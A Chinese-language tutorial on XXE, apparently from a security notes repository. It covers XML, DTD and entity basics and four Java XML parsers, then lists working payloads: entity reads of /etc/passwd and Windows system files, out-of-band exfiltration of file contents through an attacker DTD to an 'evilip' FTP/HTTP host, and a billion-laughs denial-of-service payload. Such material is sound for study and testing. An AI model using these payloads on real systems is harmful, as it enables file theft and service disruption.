# XXE

- [XML](#xml)
  - [DTD](#dtd)
  - [实体引用](#实体引用)
  
- [Java XML解析](#java_xml解析)
  - [DOM](#dom)
  - [SAX](#sax)
  - [JDOM](#jdom)
  - [DOM4J](#dom4j)
  
- [Payloads](#payloads)
  - [有回显](#有回显)
  - [无回显](#无回显)
  - [DDOS](#ddos)
  - [常见报错](#常见报错)

## xml

XML（eXtensible Markup Language），可扩展的标记语言，所有的标签都可以自定义。XML常被用于配置文件，记录和传递信息。

假设`student.xml`文件内容如下

```xml
<?xml version="1.0" encoding="UTF-8"?>  <! --perlog序言-->
<scores>
    <student id="1">
        <name>张三</name>
        <course>java</course>
        <score>90</score>
    </student>
    <student id="2">
        <name>李四</name>
        <course>xml</course>
        <score>99</score>
    </student>
</scores>
```

### dtd

DTD（Document Type Definition，文档类型定义）是一组标记声明，为GML、SGML、XML、HTML等标记语言定义文档类型，定义了一种文档约束。从DTD的角度来看，XML包含五部分：`Elements元素、Attributes属性、Entities实体、PCDATA(Parsed Character Data被解析字符数据)、CDATA(Character Data字符数据)`。简单理解PCDATA和CDATA的区别就是PADATA是位于标签中间的数据，需要被xml解析。

student.xml文件加入对应的内部DTD约束如下：

```xml
<!DOCTYPE scores [ <! --定义根元素-->
        <!ELEMENT scores (student*) >  <! --定义scores元素包含任意个student元素-->
        <!ELEMENT student (name, course, score)> <! --定义student元素必须包含三个元素: name course score-->
        <!ATTLIST student id CDATA #REQUIRED>  <! --ATTLIST声明属性-->
        <!ELEMENT name (#PCDATA)>
        <!ELEMENT course (#PCDATA)>
        <!ELEMENT score (#PCDATA)>
        ]>
```
如果想要把DTD约束定义在外部文档中，那么student.xml文档中只需要加入一句`<!ENTITY 实体名称 SYSTEM "URI/URL">`，如下。引入的scores.dtd参照内部DTD约束（但是去除`<!DOCTYPE scores [ `的声明）
```
<!DOCTYPE scores SYSTEM "scores.dtd" >
```

### 实体引用

实体是对数据的引用，例如引用文本或特殊字符变量。实体也分为内部实体和外部实体，外部实体可以理解为定义在其他外部文件中。所有的实体以`&`开头，`;`结尾。上述student.xml中定义name为张三的方式如下
```xml
<student id="1">
    <name>张三</name>
</student>
```
如果改用实体引用的方式，如下
```xml
<! --内部实体-->

<!ENTITY name "张三">
<student><name>&name;</name></student>

<! --外部实体-->

<!ENTITY name SYSTEM "name.dtd">
<student><name>&name;</name></student>
```

xml对于有特殊意义的五个字符，已经默认转为实体引用，如下

```
<    &lt;	
>    &gt;
&    &amp;	
'    &apos;	
"    &quot;
```


## java_xml解析

Java解析XML的方式主要有四种：DOM(Document Object Model)、SAX(Simple API for XML)、JDOM(Java Document Object Model)和DOM4J。

### dom

DOM一次性读取XML，并在内存中表示为树形结构，包括：`DOCUMENT_NODE、ELEMENT_NODE、ATTRIBUTE_NODE`等节点，分别表示整个XML文档、XML元素、XML元素的属性等。可参考：https://www.w3.org/TR/2004/REC-DOM-Level-3-Core-20040407/introduction.html

```java
import org.w3c.*;
import javax.xml.parsers.*;

File f=new File("student.xml");
DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
DocumentBuilder builder=factory.newDocumentBuilder();
Document doc=builder.parse(f); // 可以接收InputStream，File或者URL

NodeList n=doc.getElementsByTagName("student");
System.out.println(doc.getElementsByTagName("name").item(0).getFirstChild().getNodeValue());
```


### sax

SAX基于流的解析方式边读XML边解析，并以事件回调的方式返回数据，所以在解析函数中需要传入一个继承自`DefaultHandler`的回调对象。包含`startDocument()、startElement()、characters()、endElement()`等事件。分别表示开始读取xml文档、读取到元素<student>、读取到字符、读取到结束元素</student>等。

```java
import javax.xml.parsers.*;

File f=new File("student.xml");
SAXParserFactory saxParserFactory=SAXParserFactory.newInstance();
SAXParser saxParser=saxParserFactory.newSAXParser();
MyHandler dh = new MyHandler();
saxParser.parse(f, dh); // 需要传入一个回调函数，解析过程中的处理取决于回调函数
```

### jdom

DOM是与平台和语言无关的方式表示XML文档的官方标准。JDOM则是在DOM基础上开发的针对Java的扩展。

```java
import org.jdom.*;

File f=new File("student.xml");
SAXBuilder builder=new SAXBuilder();
Document document=builder.build(f);

List Nodelists=document.getRootElement().getChildren();
for (int i=0;i<Nodelists.size();i++){
    System.out.println(((Element)(Nodelists.get(i))).getChild("name").getText());
}
```

### dom4j

DOM4J是JDOM的一个分支，提供了更大的灵活性。Hibernate就采用DOM4J来读取配置文件

```java
import org.dom4j.*;

File f=new File("student.xml");
SAXReader reader=new SAXReader();
Document document=reader.read(f);

Iterator i=document.getRootElement().elementIterator();
while (i.hasNext()) {
    Element foo = (Element) i.next();
    System.out.println(foo.getName() + "=" + foo.getStringValue());
}
```

## payloads
### 有回显
有回显，可以用file或者netdoc协议读取文件
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [
        <!ELEMENT creds ANY>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">   <! --或为"file:///c:/windows/system.ini"-->
        ]>
<creds>&xxe;</creds>
```
有回显，且读取的文件包含特殊字符，用CDATA包住文本避免被解析。
```xml
<! --payload.xml-->

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [
        <!ENTITY % start "<![CDATA[">
        <!ENTITY % goodies SYSTEM "file:///c:/windows/system.ini">
        <!ENTITY % end "]]>">
        <!ENTITY % dtd SYSTEM "evil.dtd"> %dtd; ]>

<creds>&all;</creds>

<! --evil.dtd-->

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```
### 无回显
无回显，用http或ftp协议外带数据。但内部Entity中禁止引用参数实体，所以DTD中要把`%`转义成`&#37;`
```xml
<! --payload.xml-->

<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ip:port/evil.dtd">%remote;%int;%send;]>

<! --ftp下的evil.dtd-->

<!ENTITY % file SYSTEM "file:///C:\Windows\win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://evilip:port/%file;'>">

<! --http下的evil.dtd-->

<!ENTITY % file SYSTEM "file:///C:\Windows\win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://evilip:port/?p=%file;'>">
```
python起http或ftp服务
```
python3 -m http.server 8080
python3 -m pyftpdlib -p 8081
```

### ddos
```xml
<?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     ]>
     <lolz>&lol6</lolz>
```


### 常见报错
**（1）内部参数实体引用**
```
 The entity name must immediately follow the '%' in the parameter entity reference
 
 The character reference must end with the ';' delimiter
```
这两个报错常见于在`evil.dtd`中。问题在于将`"<!ENTITY &#37; send SYSTEM 'ftp://evilip:port/%file;'>">`的`&#37;`写成了`%`
如果我们把a.txt换成windows下的敏感文件，如<!ENTITY % file SYSTEM "file:///c:/windows/system.ini">，java会报错Exception in thread "main" java.net.MalformedURLException: Illegal character in URL，这是因为敏感文件中可能存在特殊字符，造成编码问题。

**（2）协议不支持/编码问题**
```
java.net.MalformedURLException: no protocol
```
出现这个报错的可能性包括用了`expect`这种Java不支持的协议，或者编码存在问题，需要设定编码格式如下。
```
Document doc = builder.parse(new InputSource(new ByteArrayInputStream(send.getBytes("utf-8"))));  
```

**（3）xml格式存在问题**
```
The markup declarations contained or pointed to by the document type declaration must be well-formed
```
文档类型声明可能存在错误例如`<?xml version="1.0" encoding="utf-8"?><!DOCTYPE ...`闭合不完整

 

